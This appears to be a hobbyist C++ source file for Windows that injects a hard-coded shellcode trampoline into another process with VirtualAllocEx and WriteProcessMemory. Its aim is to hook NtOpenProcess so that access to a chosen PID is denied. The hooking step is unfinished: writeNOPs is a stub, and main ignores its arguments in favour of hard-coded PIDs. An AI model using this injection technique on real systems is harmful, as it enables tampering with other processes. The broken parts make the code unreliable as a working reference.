#include "../imports.h"
#include <psapi.h>

#pragma comment(lib, "psapi.lib")

LPVOID getRemoteProcAddress(int targetPid, const char* dllName, const char* functionName);
void injectCode(int hookPid, int protectPid, const char* dllName, const char* functionName);
LPVOID injectTrampoline(HANDLE hProcess, int protectPid);
BOOL writeNOPs(HANDLE hProcess, LPVOID lpAddress, int numBytes);

/*
    This code args are 
    hookPid: what PID we r going to inject code into
    protectPid: what PID we want to deny access with OpenProcess
    
    Remember to run 
    gcc -o .\creating-hookDll.exe .\creating-hookDll.cpp
*/

/*  Description:
    Write no function instruction (nop) to shellcode
*/
BOOL writeNOPs(HANDLE hProcess, LPVOID lpAddress, int numBytes){
    return false;
}

/*  Description:
        Inject code in hProcess to deny access to protectPID,
        modifying NtOpenProcess (located at ntdll.dll, appear in Ntddk.h)
        (Which is called by OpenProcess in Kernel32.dll (WindowsAPI))
*/
LPVOID injectTrampoline(HANDLE hProcess, int protectPid){

    // Using values in [0, 255]
    unsigned char trampolineOpcodes[] = { 0x41,0x8B,0x01,0x3D,0x84,0x10,0x00,0x00,0x75,0x06,0xB8,0x22,0x00,0x00,0xC0,0xC3,0x4C,0x8B,0xD1,0xB8,0x23,0x00,0x00,0x00,0x0F,0x05,0xC3 };
	
    // Write protectPid starting in position 4 on trampolineOpcodes, which will overwrite 
    // the block {...,0x84,0x10,0x00,0x00,...} (Size 4)
	memcpy(&trampolineOpcodes[4], &protectPid, 4);  //patch the PID to protect
	long sizeOfTrampoline = sizeof(trampolineOpcodes);  // Store size of shellcode so that we can alloc and write in memory

    // Base address of hProcess with SIZE_T, type and permissions.
	LPVOID lpAddressTrampoline = VirtualAllocEx(hProcess, 0, sizeOfTrampoline, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    // LPVOID lpAddress = 0 makes the function determine where to allocate.

    if (!lpAddressTrampoline){
        warn("[VirtualAllocEx] failed, Error %lx", GetLastError());
        return nullptr;
    }
    okay("[VirtualAllocEx] success");

    SIZE_T bytesWritten = 0;
    // Write trampolineOpcodes with size sizeOfTrampoline in hProcess (With write permissions), 
    // on address lpAddressTrampoline. Saving the number of bytes written on bytesWritten and them
    // compare to check if the injection worked.
	if (WriteProcessMemory(hProcess, lpAddressTrampoline, trampolineOpcodes, sizeOfTrampoline, &bytesWritten) && bytesWritten == sizeOfTrampoline) {
		okay("[WriteProcessMemory] success");
	}
	else {
		warn("[WriteProcessMemory] failed, Error %lx", GetLastError());
		VirtualFreeEx(hProcess, lpAddressTrampoline, 0, MEM_RELEASE);
	}

    // Return the address of the trampoline injected shellcode
    debug("[injectTrampoline LPVOID lpAddressTrampoline]: %p", lpAddressTrampoline);
    return lpAddressTrampoline;

}

/*  Description:
        Return the memory address in a targetPid in which a function 
        procName from dllName is called (Its working i swear)
*/
void* getRemoteProcAddress(int pid, const char* dllName, const char* functionName) {
    MODULEINFO localModuleInfo;
    void* retval = nullptr;

    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
    if (hProcess == NULL) {
        // Failed to open the process
        warn("[OpenProcess] failed, Error %lx", GetLastError());
        return nullptr;
    }
    okay("[OpenProcess] success");

    DWORD reqSizeOfBuffer = 0;
    if (EnumProcessModules(hProcess, nullptr, 0, &reqSizeOfBuffer)) {
        HMODULE* hModules = (HMODULE*)malloc(reqSizeOfBuffer);
        if (EnumProcessModules(hProcess, hModules, reqSizeOfBuffer, &reqSizeOfBuffer)) {
            for (unsigned int i = 0; i < (reqSizeOfBuffer / sizeof(HMODULE)); i++) {
                TCHAR moduleName[MAX_PATH];
                if (GetModuleBaseName(hProcess, hModules[i], moduleName, MAX_PATH) <= 256) {
                    if (_stricmp(moduleName, dllName) == 0) {
                        if (GetModuleInformation(hProcess, hModules[i], &localModuleInfo, sizeof(localModuleInfo))) {
                            HMODULE localModuleAddress = GetModuleHandle(dllName);
                            FARPROC localProcAddress = GetProcAddress(localModuleAddress, functionName);
                            DWORD_PTR offset = (DWORD_PTR)localProcAddress - (DWORD_PTR)localModuleInfo.lpBaseOfDll;
                            retval = (void*)((DWORD_PTR)hModules[i] + offset);
                            debug("[getRemoteProcAddress DWORD_PTR offset]: 0x%llx", (unsigned long long)offset);
                            break;
                        }
                    }
                }
            }
        }
        free(hModules); // Free allocated memory
    }
    CloseHandle(hProcess);
    debug("[getRemoteProcAddress LPVOID retval]: %p", retval);
    return retval;
    // Mental note: add images im saving on whatsapp to the documentation
    // at some point
}

/*  Description:
        Primary function, inject shellcode by calling getRemoteProcAddress, 
        injectTrampoline and writeNOPs
*/
void injectCode(int hookPid, int protectPid, const char* dllName, const char* functionName){
    LPVOID retval = NULL;
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, hookPid);
    if (!hProcess){ 
        warn("[OpenProcess] failed, Error %lx", GetLastError());
        return;
    }
    //  Calls personalized getProcAddress function
	LPVOID hookAtAddress = getRemoteProcAddress(hookPid, dllName, functionName);
    /*  Address of function call
        Returns a address of hookPID in which procName of dllName is called.
        Just access the memory address with x64 or something
        Or press shift+D and find the function... You choose
    */ 
    if (!hookAtAddress) {
        warn("[getRemoteProcAddress] failed, Error %lx", GetLastError());
        return;
    }
    //  Calls personalized shellcode injection function
	LPVOID trampolineAddress = injectTrampoline(hProcess, protectPid);
    //  Address to the modified ntdll function
    
}

int main(int argc, char *argv[]) {
    int hookPid;
    int protectPid;
    if (argc < 5) {
        info("Usage: %s <hookPid> <protectPid>", argv[0]);
        hookPid = 5348;
        protectPid = 6324;
    } 
    else {
        hookPid = atoi(argv[1]);
        protectPid = atoi(argv[2]);
    }

	injectCode(16776, 6324, "ntdll.dll", "NtOpenProcess");
	system("pause");
    return 0;
}